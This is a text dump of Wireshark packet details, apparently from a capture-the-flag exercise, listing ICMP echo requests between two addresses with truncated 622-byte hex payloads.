c4898f0d1a564a8360e7936a49e12c7a|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 1a0ddaed01eab53ade48da3213c5c4512caad27a953836a0‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    474 76.081480943   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 475)
	
	Frame 474: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xc5b3 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 475]
	    Data (622 bytes)
	
9c877d6a63fd54fb950213e7342fdb32|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 183bef7df0e4b624494292da92d390627cd6bf685be6c097‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    472 75.538146913   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 473)
	
	Frame 472: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xab5d [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 473]
	    Data (622 bytes)
	
1ecda01fe922c9711487024f1af4704d|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 716859b27429838383fcf2aebbb9e0820b38eaa86770d451‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    478 77.144800041   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 479)
	
	Frame 478: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x87c6 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 479]
	    Data (622 bytes)
	
c736d2d1891af9d07f623fdbc81c0ef0|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 1ea5140f3cf82097bfed8ad27429f6d7993367b06bd72e32‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    480 77.678680675   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 481)
	
	Frame 480: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x7a28 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 481]
	    Data (622 bytes)
	
1b44b22eb8fd12196d130c5bf969bc6f|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 0aac7aa7d02ea89a94c2298352114e41e22b28ef303ea562‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    476 76.613220961   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 477)
	
	Frame 476: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x30fb [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 477]
	    Data (622 bytes)
	
2bb4737257ad328630a222fb8c839f4b|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: dbc9dd24ad1abdb2438d1747bc6fd44bc3b2ef668849e86b‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    482 78.213273316   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 483)
	
	Frame 482: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xb44e [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 483]
	    Data (622 bytes)
	
b0f19ab31f4d0665e22570c996080b90|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 85bc8734f524a99581d5c15310032a128f4782fa2dd892bc‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    484 78.754226875   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 485)
	
	Frame 484: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xc23a [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 485]
	    Data (622 bytes)
	
5605b3fc0e2393cd9594c9c262d7b37d|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 837cf5baebf8876b3ec68f7ff423feed33ff31f6f84f920e‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    488 79.828728923   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 489)
	
	Frame 488: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x33ee [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 489]
	    Data (622 bytes)
	
7e0277467464a0b02b20f3fb7212d39b|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 5a525d7aef692509493b159b8a96e4ce4a47b2e91a8b7826‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    486 79.284945357   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 487)
	
	Frame 486: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x2dc4 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 487]
	    Data (622 bytes)
	
980ade7c8d467e9b0da9ff918a380b37|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 2025eab050bdc0da52a0a812601257fe00aa718cae544895‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    492 80.911366241   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 493)
	
	Frame 492: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x01a8 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 493]
	    Data (622 bytes)
	
fa5b5d830c0863889864c838cf59b451|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 63429929016ae73d1b376e62e9fd0fe22b55ac1147a9b4d9‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    494 81.451040130   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 495)
	
	Frame 494: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x97cf [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 495]
	    Data (622 bytes)
	
0573012fdc11a265fd836594adff3b23|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 6f536c92b065db568e39f638766cdbc611474892df66ab8d‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    498 82.529576612   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 499)
	
	Frame 498: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xc100 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 499]
	    Data (622 bytes)
	
56f02d1a326110a072d7c0a4cef6f326|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 2d772ca2a914a6af1f13b279a4ad36c38383c53bf7525854‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    500 83.068737984   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 501)
	
	Frame 500: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x2866 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 501]
	    Data (622 bytes)
	
8288d8a12683c6dee45fe0596bcd3569|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 77f8a4054913373c086902caa32b15a2810129025ca9426c‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    502 83.601210768   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 503)
	
	Frame 502: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x8dc2 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 503]
	    Data (622 bytes)
	
47849c638802546e4c394b94c8c5e5b2|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: c9e25ced9bcd0cd93b4aa58ebce7bb37fc2f8fad5bcfefff‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    490 80.370751646   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 491)
	
	Frame 490: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x2fc7 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 491]
	    Data (622 bytes)
	
48e4ed3593717ab862b9f833242dced6|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: ab709222ec08e1b0d202662164416c384a02c183da2bf7ac‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    504 84.144234126   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 505)
	
	Frame 504: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xd754 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 505]
	    Data (622 bytes)
	
f7c7bba3cd2bf08557c5ac6247762f42|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 225f65d650952fd790a3532ef25a0010153c338dc1a55636‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    496 81.992518059   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 497)
	
	Frame 496: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xbe79 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 497]
	    Data (622 bytes)
	
2a26a723d2576487f4f4ee108020bb60|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 438770b6c15b07ab2b01310b6d66e8074e9f3ec3673e7327‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    508 85.219891644   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 509)
	
	Frame 508: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x4d6c [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 509]
	    Data (622 bytes)
	
54a8ae4c60896c05b99d066e7103fa8f|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 16926b330b15c12be2b84ad24a48bd63f3b62d28a3993e7d‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    506 84.681233026   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 507)
	
	Frame 506: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x2d59 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 507]
	    Data (622 bytes)
	
85c840c1ca5dc060cae27d764c64ee71|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 9f7a5e479ea1481f9eef38d4593f9ffbbaf3827a57f755d9‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    512 86.278925746   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 513)
	
	Frame 512: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x4646 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 513]
	    Data (622 bytes)
	
5b8f930e4d2fbff313544d6903cb7f88|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 4c8a7bfcd87a2d94b334ebeb1427d70763d1de51aca55887‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    510 85.749283349   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 511)
	
	Frame 510: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x37c9 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 511]
	    Data (622 bytes)
	
d5622dc1551fcaeb52c769594a789de5|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 4d26e7484a819c06bc33c2eb324ee80e15b9278a23926db4‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    516 87.344765266   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 517)
	
	Frame 516: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xc154 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 517]
	    Data (622 bytes)
	
230575231c0cf5b3005df6e36408f4d7|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 9ddc56aabe6108891847c03b359e8d1702f60b54172b4460‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    514 86.813297855   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 515)
	
	Frame 514: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x2ce5 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 515]
	    Data (622 bytes)
	
fdb696134ada2a7064fb088903933b6c|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 9531a49030daa272ede769c9569c17d931ef1b11de2eb996‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    520 88.422903619   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 521)
	
	Frame 520: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x3f69 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 521]
	    Data (622 bytes)
	
7728aba07339e01370750f7e08863051|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 01a133b8b665babece7c730b0df8b6415188439049dd09ea‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    518 87.877526792   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 519)
	
	Frame 518: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x030c [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 519]
	    Data (622 bytes)
	
c7f80d1ba7b7a1e4f609e2907e5206f0|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 7efdebf9e4273fc9d3aebf1e53b56fafbefa2928146f7beb‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    524 89.499005457   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 525)
	
	Frame 524: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xd47b [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 525]
	    Data (622 bytes)
	
57baec60d8d59a35e110a84289635e23|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 5bda7682b51690aac5f39fffd5fce44ffec46ad17bec294f‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    522 88.961111068   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 523)
	
	Frame 522: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xa788 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 523]
	    Data (622 bytes)
	
19c27ed5d24d6e34a8a373f39ab1f968|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 69723fa092228528f655953aa12ac93ec5c4d00d38df9053‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    526 90.040929647   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 527)
	
	Frame 526: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x0c03 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 527]
	    Data (622 bytes)
	
05349382f79d0ddc35ca52be68ccd8cc|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: b0472ec5815faee3b6e2e39729658f343122ba563badea20‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    532 91.642218654   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 533)
	
	Frame 532: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x949e [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 533]
	    Data (622 bytes)
	
f8378f7d6da2abef09b8b0a890879611|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: e859466425af73a69bef605018eb29a910963dd3b6c53927‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    530 91.112936093   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 531)
	
	Frame 530: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x30da [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 531]
	    Data (622 bytes)
	
f6d5bf40dafd589570f9252a87b4226e|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 50191707fce6fdb8e50eab87f362c6aa57242bf3b17f74f6‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    536 92.726385722   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 537)
	
	Frame 536: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xba55 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 537]
	    Data (622 bytes)
	
39535170a0340dbf2134b9283055ef8f|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 420801e70caf7fc31b78f39bdf4a0891cfdf75177fe75b5f‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
